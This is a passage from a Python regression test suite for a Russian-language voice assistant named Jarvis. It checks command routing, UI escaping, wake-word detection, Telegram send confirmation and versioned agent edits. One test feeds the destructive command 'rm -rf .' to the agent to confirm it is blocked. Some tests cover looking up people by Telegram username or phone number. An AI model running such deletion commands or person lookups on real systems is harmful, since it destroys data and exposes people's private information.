      jarvis.extract_web_search_query("найди в интернете информацию про Марс") == "Марс")
check("обычное слово найди не отправляется в интернет",
      jarvis.extract_web_search_query("найди файл на диске") is None)

_orig_search_web = jarvis.search_web
try:
    jarvis.search_web = lambda query: f"SEARCH:{query}"
    check("интернет-поиск идёт локально без LLM",
          jarvis.handle_local_productivity_command("погугли скорость света") ==
          "SEARCH:скорость света")
finally:
    jarvis.search_web = _orig_search_web

_orig_load_todo = jarvis_store.load_todo
_orig_save_todo = jarvis_store.save_todo
_dupes = [{"task": "тест", "done": False}, {"task": "тест", "done": False}]
try:
    jarvis_store.load_todo = lambda: _dupes
    jarvis_store.save_todo = lambda items: None
    jarvis_store.todo_done(1)
    check("todo_done закрывает только выбранный дубликат",
          _dupes[0]["done"] and not _dupes[1]["done"])
finally:
    jarvis_store.load_todo = _orig_load_todo
    jarvis_store.save_todo = _orig_save_todo


section("BUG 18: UI не исполняет HTML из речи или ответа LLM")
_ui_src = "\n".join((jarvis.JARVIS_DIR / "ui" / name).read_text(encoding="utf-8")
                    for name in ("index.html", "jarvis.js", "jarvis.css"))
check("журнал диалога не использует innerHTML", "d.innerHTML" not in _ui_src)
check("текст сообщения вставляется безопасным текстовым узлом",
      "document.createTextNode(String(text))" in _ui_src)


section("приложения, TTS auto, диагностика и панель настроек")
_orig_catalog = jarvis_apps._build_app_catalog
try:
    jarvis_apps._build_app_catalog = lambda force=False: [
        {"name": "Microsoft Word", "norm": "microsoft word", "target": r"C:\Word.exe"},
        {"name": "Steam", "norm": "steam", "target": r"C:\Steam.exe"},
        {"name": "Visual Studio Code", "norm": "visual studio code", "target": r"C:\Code.exe"},
    ]
    check("русский алиас Word разрешается", jarvis.resolve_app("ворд")["name"] == "Microsoft Word")
    check("Steam разрешается точно", jarvis.resolve_app("steam")["target"].endswith("Steam.exe"))
    check("VS Code разрешается по алиасу", jarvis.resolve_app("вс код")["name"] == "Visual Studio Code")
finally:
    jarvis_apps._build_app_catalog = _orig_catalog

check("open-any требует глагол", jarvis.extract_open_app_request("расскажи про spotify") is None)
check("open-any извлекает любое приложение", jarvis.extract_open_app_request("открой программу spotify") == "spotify")
for phrase in ("включи музыку", "открой музыку", "включи песню", "запусти трек",
               "включи мою волну"):
    check(f"open-any не перехватывает медиакоманду: {phrase!r}",
          jarvis.extract_open_app_request(phrase) is None)

check("YouTube распознаётся как веб-сервис",
      jarvis.resolve_web_target("youtube") == "https://www.youtube.com/")
check("русский Ютуб распознаётся как веб-сервис",
      jarvis.resolve_web_target("ютуб") == "https://www.youtube.com/")
_orig_catalog = jarvis_apps._build_app_catalog
_orig_startfile = jarvis.os.startfile
_orig_which = jarvis.shutil.which
try:
    _opened_targets = []
    jarvis_apps._build_app_catalog = lambda force=False: []
    jarvis.os.startfile = lambda target: _opened_targets.append(target)
    jarvis.shutil.which = lambda command: None
    check("execute_system_command открывает YouTube URL",
          jarvis.execute_system_command("youtube") and
          _opened_targets == ["https://www.youtube.com/"])
    _opened_targets.clear()
    check("неизвестная цель не вызывает системное окно",
          jarvis.execute_system_command("definitely_missing_jarvis_target") is False and
          not _opened_targets)
finally:
    jarvis_apps._build_app_catalog = _orig_catalog
    jarvis.os.startfile = _orig_startfile
    jarvis.shutil.which = _orig_which

_run_assistant_module = source_containing("def run_assistant():")
_run_src = _run_assistant_module[_run_assistant_module.index("def run_assistant():"):]
check("специальные intent-команды имеют приоритет над open-any",
      _run_src.index("intent_tag = detect_intent_from_text(cmd_lower)") <
      _run_src.index("open_query = extract_open_app_request(cmd_lower)"))

_orig_tts_engine = jarvis_tts.TTS_ENGINE
_orig_piper_available = jarvis_tts._piper_available
try:
    jarvis_tts.TTS_ENGINE = "auto"
    jarvis_tts._piper_available = lambda: True
    check("TTS auto выбирает Piper при наличии модели",
          jarvis_tts._effective_tts_engine() == "piper")
    jarvis_tts._piper_available = lambda: False
    check("TTS auto выбирает edge без Piper",
          jarvis_tts._effective_tts_engine() == "edge")
finally:
    jarvis_tts.TTS_ENGINE = _orig_tts_engine
    jarvis_tts._piper_available = _orig_piper_available

check("Piper использует спокойный темп", 1.0 < jarvis.PIPER_LENGTH_SCALE <= 1.2)
check("настройки тембра Piper доступны в UI",
      "PIPER_NOISE_SCALE" in src and
      'data-key="PIPER_NOISE_SCALE"' in _ui_src)

check("панель настроек не вставляет микрофоны через innerHTML", "s.innerHTML" not in _ui_src)
check("панель вызывает безопасный API сохранения", "var submitted = collectSettings();" in _ui_src
      and "a.save_settings(submitted)" in _ui_src)
check("API-ключ не возвращается в UI", "OPENROUTER_API_KEY_SET" in src)
check("версия приложения задана", jarvis.APP_VERSION.startswith("1."),
      f"APP_VERSION={jarvis.APP_VERSION}")

_old_spoken = jarvis_state.last_spoken_text
_old_followup_mode = jarvis.FOLLOWUP_MODE
try:
    jarvis.FOLLOWUP_MODE = "strict"
    jarvis_state.last_spoken_text = "Открываю браузер, сэр. Выполняю команду."
    check("эхо последнего ответа отбрасывается",
          jarvis._is_stray_speech("Открываю браузер сэр выполняю команду"))
    check("новая команда в strict follow-up принимается",
          not jarvis._is_stray_speech("открой калькулятор"))
    check("посторонняя фраза в strict follow-up отбрасывается",
          jarvis._is_stray_speech("мы потом пойдем в магазин"))
finally:
    jarvis_state.last_spoken_text = _old_spoken
    jarvis.FOLLOWUP_MODE = _old_followup_mode

check("музыка не делает слепой клик по центру экрана",
      "pyautogui.click(screen_width / 2" not in src)
check("музыка использует безопасную media-клавишу",
      '_plat.press_media_key("playpause")' in src)
check("STT пишет длительность аудио в метрики", "[STT:metrics]" in src)
check("maximize не вызывает pywebview maximize напрямую",
      '_ui_window.maximize()' not in src)
check("frameless maximize использует нативный ShowWindowAsync",
      'ShowWindowAsync(hwnd, commands[action])' in src)
check("событие закрытия окна логируется", '_window_event("closed")' in src)
check("UI не перечисляет PortAudio устройства параллельно слушателю",
      'sr.Microphone.list_microphone_names()' not in
      src[src.index('class JarvisApi:'):src.index('def _select_mic():')])
check("список микрофонов кэшируется до запуска слушателя",
      '_microphone_names_cache = tuple(names)' in src)
check("UI подключается после запуска фонового слушателя",
      src.index('stop_listening = recognizer.listen_in_background') <
      src.index('ui_call("window.jvConnected && jvConnected()")'))

overlay_src = Path("overlay.py").read_text(encoding="utf-8")
check("overlay завершается при EOF родительского процесса",
      'for line in sys.stdin:' in overlay_src and
      'self.closed = True' in overlay_src and 'self.root.destroy()' in overlay_src)

ui_src = _ui_src
check("drag-зона не перекрывает кнопки заголовка",
      '.titlebar .grip { position: absolute; inset: 0 174px 0 0; }' in ui_src)


section("BUG 19: гипотетический вопрос не выполняется + Telegram integration")
_hypothetical = ("если я тебе сейчас скажу выгрузить из телеграмма какой то диалог "
                 "ты сможешь это сделать")
check("распознаётся гипотетический вопрос", jarvis._is_hypothetical_action_question(_hypothetical))
check("гипотетический Telegram-вопрос не превращается в действие",
      jarvis.detect_telegram_intent_from_text(_hypothetical) is None)

_shell_calls = []
_old_shell = jarvis.run_shell_command
try:
    jarvis.run_shell_command = lambda cmd: _shell_calls.append(cmd) or "запущено"
    _hyp_reply = jarvis.parse_and_execute_tags("[CMD:команда]", _hypothetical)
    check("[CMD:команда] из ответа LLM не запускается", not _shell_calls)
    check("на вопрос возвращается пояснение без выполнения", "никаких действий" in _hyp_reply)
finally:
    jarvis.run_shell_command = _old_shell

check("шаблонная shell-команда отклоняется до PowerShell",
      "Не получил конкретную" in jarvis.run_shell_command("команда"))
check("конкретный экспорт Telegram распознаётся локально",
      jarvis.detect_telegram_intent_from_text(
          "выгрузи из телеграмма диалог с Иваном последние 200 сообщений"
      ) == "[TG:EXPORT:иваном:200]")
check("список Telegram-чатов распознаётся локально",
      jarvis.detect_telegram_intent_from_text("покажи мои чаты в телеграме") == "[TG:CHATS]")

_old_pending_tg = jarvis_state.pending_telegram_send
_old_pending_email = jarvis_state.pending_email_send
_old_tg_send = jarvis_telegram._telegram_send_resolved
_old_tg_operation = jarvis_telegram._telegram_authorized_operation
try:
    from telethon.tl.types import InputPeerUser
    _peer = InputPeerUser(101, 987)
    jarvis_telegram._telegram_authorized_operation = lambda *a: {"peer": _peer, "chat": "Иван (ID 101)"}
    jarvis_state.pending_telegram_send = None
    _confirmation = jarvis_telegram.telegram_request_send("Иван", "Буду через час")
    check("Telegram SEND сначала просит подтверждение",
          jarvis_state.pending_telegram_send is not None and "Подтвердите" in _confirmation)
    check("короткое подтверждение не отбрасывается follow-up фильтром",
          not jarvis._is_stray_speech("подтверждаю"))
    jarvis_telegram._telegram_send_resolved = lambda payload: (
        f"sent:{payload['chat']}:{payload['text']}" if payload["peer"] is _peer else "wrong peer")
    check("сообщение отправляется только после подтверждения",
          jarvis_telegram.telegram_confirm_pending("подтверждаю") == "sent:Иван (ID 101):Буду через час")
    check("pending очищается после отправки", jarvis_state.pending_telegram_send is None)
    jarvis_telegram.telegram_request_send("Иван", "Отмена")
    check("отправку Telegram можно отменить",
          "отменена" in jarvis_telegram.telegram_confirm_pending("отмена").lower())
finally:
    jarvis_state.pending_telegram_send = _old_pending_tg
    jarvis_state.pending_email_send = _old_pending_email
    jarvis_telegram._telegram_send_resolved = _old_tg_send
    jarvis_telegram._telegram_authorized_operation = _old_tg_operation

check("Telegram API Hash не возвращается из панели открытым текстом",
      "TELEGRAM_API_HASH_SET" in src and
      "k==='TELEGRAM_API_HASH'" in ui_src)
check("панель содержит авторизацию Telegram кодом и 2FA",
      "telegram_send_code" in ui_src and "telegram_sign_in" in ui_src and
      'id="telegramPassword"' in ui_src)
check("Telegram session исключена из Git", "telegram_data/" in Path(".gitignore").read_text(encoding="utf-8"))


section("BUG 20: Джарвис не всегда отзывался на своё имя")
for _tok in ["джарез", "джаммитс", "джанес", "жарвес", "джарвис"]:
    check(f"ловит искажение имени: {_tok!r}", jarvis.contains_wake_word(_tok))
check("реальный промах из логов: 'Джарез. Включи музыку.'",
      jarvis.contains_wake_word("Джарез. Включи музыку.") and
      jarvis.strip_wake_word("Джарез. Включи музыку.") == "Включи музыку.")
check("реальный промах из логов: 'Джаммитс, открой Spotify'",
      jarvis.contains_wake_word("Джаммитс, открой Spotify"))

for _w in ["держись", "договаривались", "дарим", "жарим", "ужаристы",
           "древеса", "дагарки", "джаз", "джакузи", "дарвин", "давись"]:
    check(f"не срабатывает на обычное слово: {_w!r}", not jarvis.contains_wake_word(_w))

check("общий фаззи-порог не тронут (0.72)", jarvis.WAKE_FUZZY_THRESHOLD == 0.72)
check("смягчённый порог только для начала 'джа'/'жарв'",
      jarvis.WAKE_ONSET_RE.match("джарез") is not None and
      jarvis.WAKE_ONSET_RE.match("держись") is None)
check("короткие токены под смягчённый порог не попадают",
      jarvis.WAKE_ONSET_MIN_LEN >= 5)

check("во время своей речи Джарвис слышит обращение и обрывает ответ",
      "_state.interrupt_event.set()" in src and "speaking_now" in src)
check("длинное эхо во время речи не транскрибируется",
      "BARGE_IN_MAX_AUDIO" in src and jarvis.BARGE_IN_MAX_AUDIO > 0)

_saved_spoken = jarvis_state.last_spoken_text
try:
    jarvis_state.last_spoken_text = "Открываю браузер, сэр."
    check("эхо собственной фразы распознаётся",
          jarvis._is_echo_of_last_spoken("открываю браузер сэр"))
    check("нормальная команда не считается эхом",
          not jarvis._is_echo_of_last_spoken("поставь таймер на десять минут"))
finally:
    jarvis_state.last_spoken_text = _saved_spoken


section("BUG 21: v1.1 features — session / windows / remind / files / mail hooks")
check("модуль jarvis_features подключён", hasattr(jarvis, "_feat"))
_f = jarvis._feat
_when = _f.parse_reminder_request("напомни в 18:30 купить молоко")
check("парсер напоминания 'в ЧЧ:ММ'", _when is not None and "молоко" in _when[1])
_when2 = _f.parse_reminder_request("напомни через 10 минут чай")
check("парсер напоминания 'через N минут'", _when2 is not None and "чай" in _when2[1])
check("не-напоминание не парсится", _f.parse_reminder_request("какая погода") is None)

_f.session_clear()
_f.session_record("user", "привет")
_f.session_record("assistant", "Здравствуйте, сэр.")
check("session_context не пуст после записи", len(_f.session_context()) > 0)
check("session_summary отвечает", "сэр" in _f.session_summary().lower())
_f.session_clear()
check("session_clear очищает контекст", _f.session_context() == "")

_saved_desk = _f.window_show_desktop
_saved_clip = _f.clipboard_read
_f.window_show_desktop = lambda: "ок-стол"
_f.clipboard_read = lambda: "ок-буфер"
try:
    check("локальная команда буфера ловится",
          jarvis.handle_local_feature_command("что в буфере") == "ок-буфер")
    check("роутер рабочего стола вызывает handler",
          jarvis.handle_local_feature_command("покажи рабочий стол") == "ок-стол")
finally:
    _f.window_show_desktop = _saved_desk
    _f.clipboard_read = _saved_clip
check("режим фокуса распознаётся роутером",
      _f.handle_feature_command("режим фокус") == "__FOCUS_MODE__")
check("open-any не перехватывает 'открой файл …'",
      jarvis.extract_open_app_request("открой файл отчет") is None)
check("open-any не перехватывает 'открой окно chrome'",
      jarvis.extract_open_app_request("открой окно chrome") is None)
check("версия 1.1+", tuple(int(x) for x in jarvis.APP_VERSION.split(".")[:2]) >= (1, 1))
check("FAST_VAD флаг описан в коде", "JARVIS_FAST_VAD" in src)
check("lookup: юзернейм @durov",
      jarvis.extract_lookup_request("найди информацию по юзернейму @durov") == ("tg", "durov"))
check("lookup: номер телефона",
      jarvis.extract_lookup_request("найди информацию по номеру +7 999 123-45-67")
      == ("phone", "+79991234567"))
check("lookup: 8XXXXXXXXXX нормализуется в +7",
      jarvis.extract_lookup_request("пробей номер 89991234567") == ("phone", "+79991234567"))
check("обычная фраза не становится lookup",
      jarvis.extract_lookup_request("открой браузер") is None)
check("гипотетический lookup не идёт в detect_telegram_intent",
      jarvis.detect_telegram_intent_from_text(
          "если я попрошу найти в телеграме пользователя durov, ты сможешь?") is None)
check("тег LOOKUP описан в промпте", "[LOOKUP:TG:" in jarvis.SYSTEM_PROMPT_BASE)


section("Статический анализ: файл импортируется и парсится")
import ast
try:
    ast.parse(src)
    check("jarvis.py — валидный Python", True)
except SyntaxError as e:
    check("jarvis.py — валидный Python", False, f"строка {e.lineno}: {e.msg}")

check("не осталось подстрочных матчеров команд",
      "any(w in cmd_lower for w in [" not in src)


section("Правки агента версионируются и откатываются голосом")

import jarvis_fileops

_calls = []
_orig_resolve = project_agent._resolve_project
_orig_undo = jarvis_fileops.undo_last
_orig_hist = jarvis_fileops.list_history
try:
    project_agent._resolve_project = lambda name: Path("/фиктивный") / name
    jarvis_fileops.undo_last = lambda root: _calls.append(("undo", root.name)) or "откачено"
    jarvis_fileops.list_history = lambda root, limit=10: _calls.append(("list", root.name)) or "история"

    check("«отмени последнюю правку» откатывает",
          jarvis.handle_local_feature_command(
              "отмени последнюю правку в проекте Jarvis") == "откачено")
    check("«покажи правки» показывает историю",
          jarvis.handle_local_feature_command(
              "покажи правки в проекте Jarvis") == "история")
    check("имя проекта извлечено верно", _calls and _calls[0][1] == "Jarvis", str(_calls))
    check("обычная команда не перехватывается",
          jarvis.handle_local_feature_command("отмени таймер") != "откачено")

    project_agent._resolve_project = lambda name: (_ for _ in ()).throw(
        ValueError("Проект не найден в разрешённых папках"))
    _answer = jarvis.handle_local_feature_command("отмени правку в проекте выдумка")
    check("незнакомый проект объясняется, а не падает",
          isinstance(_answer, str) and "не найден" in _answer, str(_answer))
finally:
    project_agent._resolve_project = _orig_resolve
    jarvis_fileops.undo_last = _orig_undo
    jarvis_fileops.list_history = _orig_hist

check("запись агента идёт через версионирование",
      "write_versioned" in module_src("project_agent.py"))
import tempfile
with tempfile.TemporaryDirectory(prefix="jarvis-regression-agent-") as _directory:
    _root = Path(_directory)
    (_root / "app.py").write_text("raise RuntimeError('must not execute')", encoding="utf-8")
    check("агенту запрещено рекурсивное удаление",
          "заблокирована" in project_agent._execute(_root, "run_command", {"command": "rm -rf ."}))
    check("агент выполняет разрешённую команду",
          "exit=0" in project_agent._execute(
              _root, "run_command", {"command": "python -c \"print('ok')\""}))
check("история правок не уходит в гит",
      "file_history/" in Path(".gitignore").read_text(encoding="utf-8"))


passed = sum(1 for _, ok, _ in _results if ok)
total = len(_results)
print("\n" + "=" * 60)
print(f"ИТОГ: {passed}/{total} тестов прошло")
if passed < total:
    print("\nПРОВАЛЕНЫ:")
    for name, ok, detail in _results:
        if not ok:
            print(f"  - {name}" + (f"  ({detail})" if detail else ""))
    sys.exit(1)
print("Все тесты прошли.")
sys.exit(0)
